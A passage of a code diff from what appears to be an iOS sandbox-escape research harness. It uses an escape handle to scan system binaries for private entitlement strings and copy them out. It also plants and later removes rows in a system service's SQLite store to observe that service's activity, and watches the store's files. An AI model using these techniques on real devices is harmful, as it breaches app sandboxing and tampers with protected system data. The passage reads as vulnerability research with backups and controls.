@@ -50,6 +50,9 @@ enum { V_PING = 1, V_MAKE = 2, V_EXIT = 3 };
 #include <sqlite3.h>
 #include <stdarg.h>
 #include <sys/sysctl.h>
+#include <notify.h>
+#import <MediaPlayer/MPNowPlayingInfoCenter.h>
+#import <MediaPlayer/MediaPlayer.h>
 #include <sys/ioctl.h>
 #include <ifaddrs.h>
 #include <net/if.h>
@@ -28360,6 +28363,60 @@ static int bq18_count(sqlite3 *db, const char *sql) {
     return n;
 }
 
+// Полный дамп строк feedEntries (bq27: ловим продюсерскую строку целиком):
+// каждый столбец, текст усечён до 200 символов, BLOB — hex до 400 байт.
+// Нужен для формата строки продюсера (clock.timers, lnValue =
+// NSKeyedArchiver-байты) — прежние снапшоты его не захватили (в магазине
+// лежало всего 2 статические строки).
+static void bq27_dump_rows(sqlite3 *db, const char *tag) {
+    NSMutableArray *cols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(db, "PRAGMA table_info(feedEntries)", -1, &ti, NULL)
+            == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [cols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    sqlite3_stmt *s = NULL;
+    if (sqlite3_prepare_v2(db, "SELECT * FROM feedEntries", -1, &s, NULL)
+            != SQLITE_OK) {
+        LOG("[%s] dump failed: %s", tag, sqlite3_errmsg(db));
+        return;
+    }
+    int ncol = sqlite3_column_count(s);
+    int idx = 0;
+    while (sqlite3_step(s) == SQLITE_ROW) {
+        NSMutableString *line = [NSMutableString stringWithFormat:
+            @"[%s] ROW%d", tag, idx++];
+        for (int i = 0; i < ncol; i++) {
+            const char *name = sqlite3_column_name(s, i);
+            int ty = sqlite3_column_type(s, i);
+            if (ty == SQLITE_NULL) {
+                [line appendFormat:@" %s=NULL", name];
+            } else if (ty == SQLITE_BLOB) {
+                const unsigned char *ub = sqlite3_column_blob(s, i);
+                int n = sqlite3_column_bytes(s, i);
+                int show = n > 2048 ? 2048 : n;  // полный hex до 2КБ (lnValue 714/878)
+                NSMutableString *hx = [NSMutableString string];
+                for (int k = 0; k < show; k++)
+                    [hx appendFormat:@"%02x", ub[k]];
+                [line appendFormat:@" %s=BLOB(%d)%@", name, n, hx];
+            } else {
+                const unsigned char *t = sqlite3_column_text(s, i);
+                NSString *v = t ? [NSString stringWithUTF8String:
+                    (const char *)t] : @"?";
+                if (v.length > 200)
+                    v = [[v substringToIndex:200] stringByAppendingString:@"…"];
+                [line appendFormat:@" %s=%@", name, v];
+            }
+        }
+        LOG("%s", line.UTF8String);
+    }
+    sqlite3_finalize(s);
+    LOG("[%s] dump end (%d rows, %d cols)", tag, idx, (int)cols.count);
+    fsync(fileno(stderr));
+}
+
 static void p_bq18(void) {
     const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
     const uint64_t F_DEF = 0x0000008000000000ULL;
@@ -29180,6 +29237,2725 @@ static void p_bq21(void) {
     close(fd);
     bad_query_release(h);
     LOG("[bq21] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq22): find the READERS. Rootfs is a dead end — the IPSW's
+// system dmgs are AEA-encrypted (094-13007-107.dmg.aea, 9.1 GB; keys
+// exist only at restore time on-device), so the §182 blind spot can
+// only be closed from readable roots. Both facts we need live as
+// PLAIN STRINGS inside every signed on-disk Mach-O:
+//   - "com.apple.private.appintents.live-entities.read"  (entitlement)
+//   - "com.apple.private.appintents.live-entities.write" (control)
+//   - LC_LOAD_DYLIB path of AppIntentsLiveEntitySupport.framework
+//   - the mach service name itself (connectors)
+// and /System/Library is fully readable from the sandbox (bq15:
+// 3902 Mach-Os), unlike /usr/libexec (bq11: escape -> -3).
+//
+// Controls (§144):
+//   - §170 escape handle first (dead escape => no verdict);
+//   - /usr/libexec + /Applications + /System/Applications as roots
+//     must produce denials — zero denials means the walker is broken;
+//   - POSITIVE controls per needle: "write" must hit the 4 known
+//     clients (their entitlements are proven by codesign, bq20) and
+//     "read" must hit navd — zero hits on those = detector failure,
+//     not "no readers".
+// ---------------------------------------------------------------------------
+
+static int bq22_scanned, bq22_denied, bq22_skipped;
+static NSMutableSet *bq22_hits = nil;
+static NSMutableSet *bq22_dumps = nil;
+
+static void bq22_walk(NSString *dir, int depth,
+                      const char **needles, unsigned nneedles) {
+    if (depth > 6) return;
+    static NSSet *skipDirs = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        skipDirs = [NSSet setWithObjects:@"AssetsV2", @"Caches", @"Logs",
+                    @"Assets", nil];
+    });
+    DIR *d = opendir(dir.fileSystemRepresentation);
+    if (!d) { bq22_denied++; return; }
+    struct dirent *e;
+    while ((e = readdir(d))) {
+        if (e->d_name[0] == '.') continue;
+        NSString *fp = [dir stringByAppendingFormat:@"/%s", e->d_name];
+        struct stat st;
+        if (lstat(fp.fileSystemRepresentation, &st) != 0) continue;
+        if (S_ISDIR(st.st_mode)) {
+            if ([skipDirs containsObject:
+                    [NSString stringWithUTF8String:e->d_name]]) continue;
+            bq22_walk(fp, depth + 1, needles, nneedles);
+        } else if (S_ISREG(st.st_mode)) {
+            if (st.st_size > (256LL << 20)) { bq22_skipped++; continue; }
+            int fd = open(fp.fileSystemRepresentation, O_RDONLY);
+            if (fd < 0) { bq22_denied++; continue; }
+            if (!bq15_is_macho_or_model(fd)) {
+                close(fd); bq22_skipped++; continue;
+            }
+            void *buf = mmap(NULL, (size_t)st.st_size, PROT_READ,
+                             MAP_FILE | MAP_PRIVATE, fd, 0);
+            if (buf == MAP_FAILED) {
+                close(fd); bq22_skipped++; continue;
+            }
+            bq22_scanned++;
+            // ALL matching needles per file (bq15's walker stopped at
+            // the first — here "write AND link" on the same binary is
+            // exactly the classification we want).
+            NSMutableString *matched = nil;
+            for (unsigned n = 0; n < nneedles; n++) {
+                if (memmem(buf, (size_t)st.st_size, needles[n],
+                           strlen(needles[n]))) {
+                    if (!matched) matched = [NSMutableString string];
+                    [matched appendFormat:@"%s%s", matched.length ? "," : "",
+                                         needles[n]];
+                }
+            }
+            munmap(buf, (size_t)st.st_size);
+            close(fd);
+            if (matched) {
+                NSString *key = [NSString stringWithFormat:@"%@ <- %@",
+                                 fp, matched];
+                if (![bq22_hits containsObject:key]) {
+                    [bq22_hits addObject:key];
+                    LOG("[bq22]   HIT %s <- [%s]",
+                        fp.UTF8String, matched.UTF8String);
+                    fsync(fileno(stderr));
+                    // Dump for offline RE, capped (like bq20): these
+                    // are the reader/connector binaries nobody could
+                    // enumerate before.
+                    if (bq22_dumps.count < 16)
+                        [bq22_dumps addObject:fp];
+                }
+            }
+        }
+    }
+    closedir(d);
+}
+
+static void p_bq22(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq22] v177 readers: entitlement/load-command string scan");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq22] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq22] done"); return; }
+
+    const char *needles[] = {
+        "live-entities.read",
+        "live-entities.write",
+        "AppIntentsLiveEntitySupport.framework/",
+        "LiveEntityService",
+    };
+    const unsigned nneedles = 4;
+    bq22_hits = [NSMutableSet set];
+    bq22_dumps = [NSMutableSet set];
+
+    const char *roots[] = {
+        "/System/Library",
+        // Controls: all three must yield denials (bq11/bq15 lineage);
+        // zero denials => walker broken, no verdict (§144).
+        "/usr/libexec", "/Applications", "/System/Applications",
+    };
+    for (unsigned r = 0; r < sizeof(roots) / sizeof(roots[0]); r++) {
+        LOG("[bq22] root %s", roots[r]);
+        fsync(fileno(stderr));
+        NSString *rs = [NSString stringWithUTF8String:roots[r]];
+        struct stat st;
+        if (stat(rs.fileSystemRepresentation, &st) != 0) {
+            LOG("[bq22]   stat errno %d (missing)", errno);
+            continue;
+        }
+        int s0 = bq22_scanned, d0 = bq22_denied;
+        bq22_walk(rs, 0, needles, nneedles);
+        LOG("[bq22] root %s: +%d scanned, +%d denied", roots[r],
+            bq22_scanned - s0, bq22_denied - d0);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq22] scanned=%d denied=%d skipped=%d hitfiles=%d",
+        bq22_scanned, bq22_denied, bq22_skipped, (int)bq22_hits.count);
+
+    // Per-needle positive control: known entitlements (codesign, bq20)
+    // must be rediscovered by the string detector itself.
+    unsigned cw = 0, cr = 0;
+    for (NSString *k in bq22_hits)
+        if ([k containsString:@"live-entities.write"]) cw++;
+    for (NSString *k in bq22_hits)
+        if ([k containsString:@"live-entities.read"]) cr++;
+    LOG("[bq22] CONTROL needle write -> %u files (expect >=4: "
+        "callservicesd/mediaremoted/navd/mobiletimerd), read -> %u "
+        "(expect >=1: navd)", cw, cr);
+    if (cw < 4 || cr < 1)
+        LOG("[bq22] DETECTOR CONTROL FAILED — results NOT a verdict");
+    else
+        LOG("[bq22] detector control OK");
+    fsync(fileno(stderr));
+
+    // Dump hits for offline RE (byte-identical read-back, bq20 style).
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    unsigned dumped = 0;
+    for (NSString *src in bq22_dumps) {
+        if (dumped >= 16) break;
+        struct stat st;
+        if (stat(src.fileSystemRepresentation, &st) != 0) continue;
+        NSString *name = [NSString stringWithFormat:@"rdr-%u-%@",
+                          dumped, src.lastPathComponent];
+        NSString *dst = [docs stringByAppendingPathComponent:name];
+        int in = open(src.fileSystemRepresentation, O_RDONLY);
+        int out = open(dst.fileSystemRepresentation,
+                       O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (in < 0 || out < 0) {
+            if (in >= 0) close(in);
+            if (out >= 0) close(out);
+            LOG("[bq22] dump open failed %s errno %d", src.UTF8String, errno);
+            continue;
+        }
+        char buf[65536];
+        ssize_t n;
+        while ((n = read(in, buf, sizeof(buf))) > 0)
+            if (write(out, buf, n) != n) break;
+        fsync(out);
+        close(in); close(out);
+        NSData *a = [NSData dataWithContentsOfFile:src];
+        NSData *b = [NSData dataWithContentsOfFile:dst];
+        LOG("[bq22] dump %s: %lld bytes, byte-identical=%d",
+            name.UTF8String, (long long)st.st_size,
+            (a && b && [a isEqualToData:b]) ? 1 : 0);
+        fsync(fileno(stderr));
+        dumped++;
+    }
+
+    bad_query_release(h);
+    LOG("[bq22] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq23): observable-activity oracle for the feed store.
+//
+// Reading the DB leaves no file trace (bq18's 45 s of silence was
+// structurally inconclusive), but the owner's SQL contains
+//   DELETE FROM feedEntries WHERE bootId != ?
+// — if that runs at DB open, a row planted with a FOREIGN bootId is
+// deleted the moment ANY client (writer like mediaremoted, reader
+// like intelligencecontextd — bq22) makes the service touch the
+// store, while a control row with the REAL bootId must survive.
+// Deletion is a file-visible event we can poll with sqlite itself.
+//
+// Trigger: our own AVAudioSession playback (the pattern already used
+// by uatrec S4) — local playback moves nowPlaying state, and
+// mediaremoted is a proven writer (bq22: live-entities.write =
+// nowPlaying.*).
+//
+// Controls (§144): escape handle; verified byte-backup BEFORE the
+// change; live-row counts before/after; the real bootId is READ from
+// the table (never hardcoded); INSERT failure => ROLLBACK (zero
+// changes); a quiet-wait before restore so we do not race a live
+// writer; final byte-identical check.
+//
+// Outcomes (first-class, §144):
+//   - oracle row gone, control alive  => POSITIVE: service executed
+//     its bootId cleanup over rows we planted => activity detector
+//     works, and it fires on service DB open;
+//   - db/wal changed, oracle alive    => writers active, but cleanup
+//     is NOT unconditional at open (gated on bootId change) — the
+//     oracle itself is dead, use writer-activity only;
+//   - nothing changed                 => inconclusive (no service
+//     touch during window; audio may have failed on a locked screen).
+// ---------------------------------------------------------------------------
+
+static void p_bq23(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq23] v177 bootId-cleanup oracle + audio trigger");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq23] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq23] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq23] CONTROL db stat errno %d — aborting, target gone", errno);
+        bad_query_release(h); LOG("[bq23] done"); return;
+    }
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq23] CONTROL readonly open failed — aborting");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq23] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    // Real bootId straight from a live row (§181: it matches
+    // functions.list) — hardcoding it here would repeat the class of
+    // mistake the schema-column trap already punished once.
+    NSString *realBoot = nil;
+    sqlite3_stmt *q = NULL;
+    if (sqlite3_prepare_v2(db,
+            "SELECT bootId FROM feedEntries "
+            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
+            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
+        const char *b = (const char *)sqlite3_column_text(q, 0);
+        if (b) realBoot = [NSString stringWithUTF8String:b];
+    }
+    if (q) sqlite3_finalize(q);
+    LOG("[bq23] CONTROL rows: feedEntries=%d feedMetadata=%d realBootId=%s",
+        ent0, meta0, realBoot ? realBoot.UTF8String : "(none!)");
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+    if (ent0 < 0 || meta0 < 0 || !realBoot) {
+        LOG("[bq23] CONTROL incomplete (counts/bootId) — no blind INSERT");
+        bad_query_release(h); LOG("[bq23] done"); return;
+    }
+
+    // ---- BACKUP (bq18 pattern: verified copy of every file present)
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq23-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) {
+            LOG("[bq23] BACKUP absent: %s", f.lastPathComponent.UTF8String);
+            continue;
+        }
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) {
+            backupOK = NO;
+            LOG("[bq23] BACKUP FAIL for %s", f.lastPathComponent.UTF8String);
+        }
+    }
+    LOG("[bq23] BACKUP %s", backupOK ? "verified" : "BROKEN");
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq23] no verified backup — refusing to write");
+        bad_query_release(h); LOG("[bq23] done"); return;
+    }
+
+    // ---- CHANGE: two rows, same live schema walk as bq18.
+    sqlite3 *wdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq23] WRITE open failed (%s) — route closed",
+            wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq23] done"); return;
+    }
+    NSMutableArray *entCols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [entCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    if (entCols.count == 0) {
+        LOG("[bq23] schema unreadable — aborting, no blind INSERT");
+        sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq23] done"); return;
+    }
+
+    NSString *(^valFor)(NSString *, NSString *, NSString *) =
+        ^NSString *(NSString *col, NSString *feed, NSString *boot) {
+        if ([col isEqualToString:@"feedId"])    return feed;
+        if ([col isEqualToString:@"bootId"])    return boot;
+        if ([col isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+        if ([col hasPrefix:@"entity"] || [col hasPrefix:@"Entity"])
+            return @"FZ29Oracle/fz29";
+        if ([col isEqualToString:@"lastUpdate"])
+            return @"2099-01-01T00:00:00.000";
+        if ([col isEqualToString:@"lnValue"])   return @"fz29-oracle";
+        if ([col isEqualToString:@"metadata"])  return nil;
+        return @"fz29";
+    };
+    NSMutableString *cols = [NSMutableString string];
+    for (NSString *c in entCols)
+        [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+    NSString *(^insSQL)(NSString *, NSString *) =
+        ^NSString *(NSString *feed, NSString *boot) {
+        NSMutableString *vals = [NSMutableString string];
+        for (NSString *c in entCols) {
+            NSString *v = valFor(c, feed, boot);
+            [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+                v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+        }
+        return [NSString stringWithFormat:
+            @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+    };
+    // Oracle row: foreign bootId => must vanish if the owner runs its
+    // "leftover rows from another boot" cleanup at open.
+    // Control row: real bootId => must survive that same cleanup; if
+    // it vanishes too, the whole table was reset and the oracle means
+    // something else (loud log).
+    NSString *insO = insSQL(@"fz29.noboot", @"FZ29-NOBOOT-ORACLE");
+    NSString *insC = insSQL(@"fz29.bootok", realBoot);
+
+    char *err = NULL;
+    int changed = 0;
+    sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, &err);
+    int rc1 = sqlite3_exec(wdb, insO.UTF8String, NULL, NULL, &err);
+    int rc2 = rc1 == SQLITE_OK
+        ? sqlite3_exec(wdb, insC.UTF8String, NULL, NULL, &err) : rc1;
+    if (rc2 == SQLITE_OK) changed = 1;
+    else LOG("[bq23] WRITE rc=%d: %s", rc2, err ?: "?");
+    if (err) { sqlite3_free(err); err = NULL; }
+    if (!changed) {
+        sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        LOG("[bq23] WRITE rolled back — zero changes left");
+    } else {
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+        LOG("[bq23] WRITE committed: oracle=%d control=%d",
+            bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                            "WHERE feedId='fz29.noboot'"),
+            bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                            "WHERE feedId='fz29.bootok'"));
+    }
+    fsync(fileno(stderr));
+
+    // ---- TRIGGER: our own playback (uatrec S4 pattern).
+    AVAudioPlayer *player = nil;
+    if (changed) {
+        @try {
+            NSError *ce = nil, *ae = nil;
+            [[AVAudioSession sharedInstance]
+                setCategory:AVAudioSessionCategoryPlayback error:&ce];
+            [[AVAudioSession sharedInstance] setActive:YES error:&ae];
+            const int sr = 44100, nsamp = sr;   // 1 s, looped
+            NSMutableData *wav = [NSMutableData dataWithLength:44 + nsamp * 2];
+            uint8_t *w = (uint8_t *)[wav mutableBytes];
+            *(uint32_t *)(w + 0)  = 0x46464952;
+            *(uint32_t *)(w + 4)  = 36 + nsamp * 2;
+            *(uint32_t *)(w + 8)  = 0x45564157;
+            *(uint32_t *)(w + 12) = 0x20746d66;
+            *(uint32_t *)(w + 16) = 16;
+            *(uint16_t *)(w + 20) = 1;
+            *(uint16_t *)(w + 22) = 1;
+            *(uint32_t *)(w + 24) = sr;
+            *(uint32_t *)(w + 28) = sr * 2;
+            *(uint16_t *)(w + 32) = 2;
+            *(uint16_t *)(w + 34) = 16;
+            *(uint32_t *)(w + 36) = 0x61746164;
+            *(uint32_t *)(w + 40) = nsamp * 2;
+            int16_t *pcm = (int16_t *)(w + 44);
+            for (int i = 0; i < nsamp; i++) {
+                double t = (double)i / sr;
+                pcm[i] = (int16_t)(0.25 * sin(2 * 3.14159265358979323846
+                                               * 440.0 * t) * 32767.0);
+            }
+            player = [[AVAudioPlayer alloc] initWithData:wav error:&ae];
+            player.numberOfLoops = -1;
+            player.volume = 0.4;
+            LOG("[bq23] audio: catErr=%s actErr=%s play=%d",
+                ce ? "yes" : "no", ae ? [[ae localizedDescription]
+                    UTF8String] : "no", [player play] ? 1 : 0);
+        } @catch (NSException *ex) {
+            LOG("[bq23] audio exception %s", [[ex name] UTF8String]);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- OBSERVE: 90 s, 1 Hz. Presence checks use sqlite (deletion
+    // is invisible to raw bytes — freed pages keep the marker text).
+    int oracleGone = -1, ctrlGone = -1, fileChanges = 0, audioStop = -1;
+    struct stat prevDb = {0}, prevWal = {0};
+    stat(dbp.fileSystemRepresentation, &prevDb);
+    stat(walp.fileSystemRepresentation, &prevWal);
+    if (changed) {
+        for (int t = 0; t < 90; t++) {
+            usleep(1000 * 1000);
+            if (t == 25 && player) {
+                [player stop];
+                [[AVAudioSession sharedInstance] setActive:NO error:NULL];
+                audioStop = t;
+                LOG("[bq23] OBS t=%ds audio stopped", t);
+            }
+            struct stat cd = {0}, cw = {0};
+            BOOL dbCh = stat(dbp.fileSystemRepresentation, &cd) == 0 &&
+                (cd.st_mtime != prevDb.st_mtime || cd.st_size != prevDb.st_size);
+            BOOL walCh = stat(walp.fileSystemRepresentation, &cw) == 0 &&
+                (cw.st_mtime != prevWal.st_mtime || cw.st_size != prevWal.st_size);
+            if (dbCh || walCh) {
+                fileChanges++;
+                LOG("[bq23] OBS t=%ds FILE CHANGED (db %lld/%lld -> %lld/"
+                    "%lld, wal %lld -> %lld)%s", t,
+                    (long long)prevDb.st_mtime, (long long)prevDb.st_size,
+                    (long long)cd.st_mtime, (long long)cd.st_size,
+                    (long long)prevWal.st_mtime, (long long)cw.st_mtime,
+                    t < 26 ? " [during audio]" : " [after audio]");
+                prevDb = cd; prevWal = cw;
+            }
+            int o = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.noboot'");
+            int c = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.bootok'");
+            if (o == 0 && oracleGone < 0) {
+                oracleGone = t;
+                LOG("[bq23] OBS t=%ds ORACLE ROW DELETED BY THE SERVICE "
+                    "(bootId cleanup ran)", t);
+            }
+            if (c == 0 && ctrlGone < 0) {
+                ctrlGone = t;
+                LOG("[bq23] OBS t=%ds CONTROL ROW ALSO DELETED — table "
+                    "reset, not bootId cleanup!", t);
+            }
+            fsync(fileno(stderr));
+        }
+    }
+
+    // ---- ROLLBACK (bq18 pattern + quiet-wait so we don't race a
+    // live writer: two consecutive identical stats before restore).
+    int quiet = 0;
+    for (int i = 0; i < 10 && quiet < 3; i++) {
+        struct stat a = {0}, b2 = {0};
+        stat(dbp.fileSystemRepresentation, &a);
+        usleep(1000 * 1000);
+        stat(dbp.fileSystemRepresentation, &b2);
+        quiet = (a.st_mtime == b2.st_mtime && a.st_size == b2.st_size)
+            ? quiet + 1 : 0;
+    }
+    if (changed) {
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId IN "
+                     "('fz29.noboot','fz29.bootok')", NULL, NULL, NULL);
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak)) {
+            if (!bq18_copy(bak, f)) {
+                bytesBack = NO;
+                LOG("[bq23] RESTORE FAIL %s", f.lastPathComponent.UTF8String);
+            }
+        }
+    }
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq23] VERIFY rows back: feedEntries=%d/%d feedMetadata=%d/%d "
+        "bytes-identical=%d", ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+
+    const char *verdict;
+    if (oracleGone >= 0 && ctrlGone < 0)
+        verdict = "POSITIVE: cleanup ran over our rows — activity oracle WORKS";
+    else if (ctrlGone >= 0)
+        verdict = "TABLE RESET (control gone too) — interpret manually";
+    else if (fileChanges > 0)
+        verdict = "writers active but cleanup not at open — oracle dead, "
+                  "file-change detector alive";
+    else
+        verdict = "INCONCLUSIVE: store untouched in 90 s (no service open)";
+    LOG("[bq23] VERDICT: %s (oracleGone=%d ctrlGone=%d fileChanges=%d "
+        "audioStop=%d)", verdict, oracleGone, ctrlGone, fileChanges,
+        audioStop);
+
+    bad_query_release(h);
+    LOG("[bq23] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq24): long passive watcher — ZERO writes to the store.
+//
+// bq23 proved a 90 s window with our own looping tone sees no store
+// activity at all, yet the live rows carry the CURRENT bootId
+// (ECB6AA16-..., read in bq23) — writers ran during this boot, just
+// not on demand. This phase measures WHEN: stat db/wal/shm at 1 Hz
+// for FUZZ_BQ24_SECS (default 900) and log every transition with a
+// timestamp, plus the file's own mtime vs kern.boottime at start
+// (answers "was the last write at boot?").
+//
+// No INSERTs, no backup, no rollback — nothing to race (§184's
+// rollback machinery is unnecessary when nothing changes). The idle
+// timer is disabled so the screen (and thus this foreground poller)
+// survives the window; if the user locks the device the log simply
+// stops and the run is short — visible in the iteration count.
+//
+// The user performs REAL events during the window (music, Siri, call,
+// alarm) — any event that makes a producer write shows up as a file
+// transition and identifies the trigger for the read experiment.
+// ---------------------------------------------------------------------------
+
+static void p_bq24(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int secs = getenv("FUZZ_BQ24_SECS") ? atoi(getenv("FUZZ_BQ24_SECS")) : 900;
+    if (secs < 10) secs = 10;
+    LOG("[bq24] v177 passive watcher, %d s, zero writes", secs);
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq24] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq24] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+
+    struct timeval boot = {0};
+    size_t bl = sizeof(boot);
+    int brc = sysctlbyname("kern.boottime", &boot, &bl, NULL, 0);
+    struct stat sdb = {0}, swal = {0}, sshm = {0};
+    if (stat(dbp.fileSystemRepresentation, &sdb) != 0) {
+        LOG("[bq24] CONTROL db stat errno %d — target gone", errno);
+        bad_query_release(h); LOG("[bq24] done"); return;
+    }
+    stat(walp.fileSystemRepresentation, &swal);
+    stat(shmPath.fileSystemRepresentation, &sshm);
+    LOG("[bq24] CONTROL db mtime=%lld (+%llds after boot) size=%lld; "
+        "wal mtime=%lld (+%llds) size=%lld; shm size=%lld; boot rc=%d",
+        (long long)sdb.st_mtime,
+        brc == 0 ? (long long)(sdb.st_mtime - boot.tv_sec) : -1,
+        (long long)sdb.st_size, (long long)swal.st_mtime,
+        brc == 0 ? (long long)(swal.st_mtime - boot.tv_sec) : -1,
+        (long long)swal.st_size, (long long)sshm.st_size, brc);
+    fsync(fileno(stderr));
+
+    // Read-only sanity: a watcher that cannot read cannot classify.
+    sqlite3 *db = NULL;
+    int ent0 = -1;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+        sqlite3_close(db);
+    }
+    LOG("[bq24] CONTROL rows=%d", ent0);
+    fsync(fileno(stderr));
+    if (ent0 < 0) {
+        LOG("[bq24] CONTROL read broken — no verdict possible");
+        bad_query_release(h); LOG("[bq24] done"); return;
+    }
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
+    struct stat pDb = sdb, pWal = swal, pShm = sshm;
+    int changes = 0;
+    for (int t = 0; t < secs; t++) {
